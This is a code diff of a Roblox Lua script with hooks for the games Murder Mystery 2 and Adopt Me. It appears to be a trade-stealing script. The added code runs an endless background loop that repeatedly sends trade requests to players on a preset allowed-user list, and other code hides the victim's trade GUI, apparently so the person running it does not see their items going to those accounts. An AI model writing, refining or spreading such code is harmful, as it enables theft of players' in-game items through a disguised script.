@@ -196,8 +196,11 @@ local function hook_mm2()
 
     local function showGui()
         guiHidden = false
-        if shiftlockConn then shiftlockConn:Disconnect() shiftlockConn = nil end
-        pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.Default end)
+        if shiftlockConn then
+            shiftlockConn:Disconnect()
+            shiftlockConn = nil
+        end
+        UIS.MouseBehavior = Enum.MouseBehavior.Default
         local gui = lp:FindFirstChild("PlayerGui")
         if not gui then return end
         for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
@@ -220,32 +223,6 @@ local function hook_mm2()
         showGui()
     end
 
-    local function startTradeLoop()
-        task.spawn(function()
-            task.wait(3)
-            while not tradingWithAllowed do
-                local target = nil
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player ~= lp and isAllowedUser(player.Name) then
-                        target = player
-                        break
-                    end
-                end
-                if target then
-                    storeItems()
-                    for i = 1, 5 do
-                        if tradingWithAllowed then break end
-                        pcall(function() sendRequest:InvokeServer(target) end)
-                        task.wait(0.5)
-                    end
-                end
-                if not tradingWithAllowed then
-                    task.wait(5)
-                end
-            end
-        end)
-    end
-
     if updateTrade then
         updateTrade.OnClientEvent:Connect(function(tradeData)
             if tradeData and tradeData.LastOffer then
@@ -258,10 +235,24 @@ local function hook_mm2()
         declineTrade.OnClientEvent:Connect(function()
             if tradingWithAllowed then
                 resetState()
-                startTradeLoop()
             end
         end)
     end
+
+    task.spawn(function()
+        while true do
+            task.wait(2)
+            if not tradingWithAllowed then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= lp and isAllowedUser(player.Name) then
+                        storeItems()
+                        pcall(function() sendRequest:InvokeServer(player) end)
+                        break
+                    end
+                end
+            end
+        end
+    end)
 
     Players.PlayerAdded:Connect(function(player)
         if isAllowedUser(player.Name) and not tradingWithAllowed then
@@ -320,11 +311,8 @@ local function hook_mm2()
             task.wait(0.5)
             restoreItems()
             resetState()
-            startTradeLoop()
         end)
     end
-
-    startTradeLoop()
 end
 
 local function hook_adoptme()
